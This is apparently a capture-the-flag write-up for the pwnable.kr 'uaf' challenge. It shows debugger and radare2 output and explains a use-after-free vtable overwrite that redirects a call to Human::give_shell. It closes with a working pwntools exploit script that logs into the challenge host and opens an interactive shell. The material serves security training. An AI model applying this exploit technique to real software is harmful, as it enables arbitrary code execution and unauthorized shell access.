Breakpoint 2 at 0x400fe2
gdb-peda$ r 8 ./buffer.txt
Starting program: /home/robi/Documents/ulisse_lab/CTFs/pwnable.kr/uaf/uaf 8 ./buffer.txt
1. use
2. after
3. free
1
[----------------------------------registers-----------------------------------]
RAX: 0xc16ee0 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
RBX: 0xc16f30 --> 0x401550 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
RCX: 0x0 
RDX: 0x4012d2 (<_ZN3Man9introduceEv>:	push   rbp)

```
_rdx_ is obtained by adding 0x8 to _rax_.

_rax_ is a reference to 0x401570
```
robi@kaya pwnable.kr/uaf (master*) $ r2 uaf 
 -- WASTED
[0x00400de0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00400de0]> av

Vtable Found at 0x00401550
0x00401550 : method.Human.give_shell
0x00401558 : method.Woman.introduce


Vtable Found at 0x00401570
0x00401570 : method.Human.give_shell
0x00401578 : method.Man.introduce


Vtable Found at 0x00401590
0x00401590 : method.Human.give_shell
0x00401598 : method.Human.introduce
```
Allocating after the free will permit us to overwrite _rax_ value: so we have to set _rax_ to 0x00401570 - 0x8.

Note that we have to allocate two times after free because the first allocation will allocate the old w and the second the old m: in fact allocating only one time will result in a SIGSEG beacause m (unallocated) will be called before w.

```python
#! /usr/bin/env

from pwn import *

HOST='pwnable.kr'
PORT=2222
USER='uaf'
PASSWORD='guest'
BIN='./uaf'

conn = ssh(host=HOST, port=PORT,
        user=USER,
        password=PASSWORD)
#context.log_level = 'debug'

payload = p64(0x00401570 - 8)

p = conn.process([ BIN, '8', '/dev/stdin' ])
print p.recv(1024)
p.sendline('3')
print p.recv(1024)
p.sendline('2')
p.sendline(payload)
print p.recv(1024)
p.sendline('2')
p.sendline(payload)
print p.recv(1024)
p.sendline('1')
p.interactive()
```
